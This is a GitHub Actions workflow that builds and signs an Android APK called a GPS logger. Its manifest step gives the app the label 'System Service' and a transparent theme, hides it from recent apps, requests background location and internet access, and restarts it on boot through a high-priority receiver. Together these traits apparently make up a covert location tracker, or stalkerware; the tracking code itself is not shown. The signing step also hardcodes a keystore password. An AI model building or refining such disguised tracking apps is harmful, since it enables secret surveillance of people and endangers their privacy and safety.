name: Build GPS Logger APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Android SDK Build Tools
        run: |
          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager "build-tools;34.0.0"

      - name: Rewrite AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'MANIFEST'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <application
                  android:allowBackup="false"
                  android:label="System Service"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.Transparent">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:excludeFromRecents="true"
                      android:noHistory="true"
                      android:taskAffinity="">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service
                      android:name=".GpsLoggerService"
                      android:enabled="true"
                      android:exported="false"
                      android:foregroundServiceType="location" />
                  <receiver
                      android:name=".BootReceiver"
                      android:enabled="true"
                      android:exported="true">
                      <intent-filter android:priority="1000">
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          MANIFEST

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.6'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.6 --distribution-type bin

      - name: Make gradlew executable
        run: chmod +x gradlew

      - name: Build Release APK
        run: ./gradlew assembleRelease

      - name: Generate Keystore and Sign APK
        run: |
          keytool -genkey -v \
            -keystore keystore.jks \
            -alias gps \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -storetype PKCS12 \
            -storepass 'Ars@123' \
            -keypass 'Ars@123' \
            -dname "CN=ARS,OU=Dev,O=ARS,L=City,ST=Punjab,C=PK"

          BUILD_TOOLS=$ANDROID_SDK_ROOT/build-tools/34.0.0

          $BUILD_TOOLS/zipalign -v -p 4 \
            app/build/outputs/apk/release/app-release-unsigned.apk \
            app/build/outputs/apk/release/app-release-aligned.apk

          $BUILD_TOOLS/apksigner sign \
            --ks keystore.jks \
            --ks-key-alias gps \
            --ks-pass pass:Ars@123 \
            --key-pass pass:Ars@123 \
            --out app/build/outputs/apk/release/gps-logger-signed.apk \
            app/build/outputs/apk/release/app-release-aligned.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: gps-logger-signed.apk
          path: app/build/outputs/apk/release/gps-logger-signed.apk
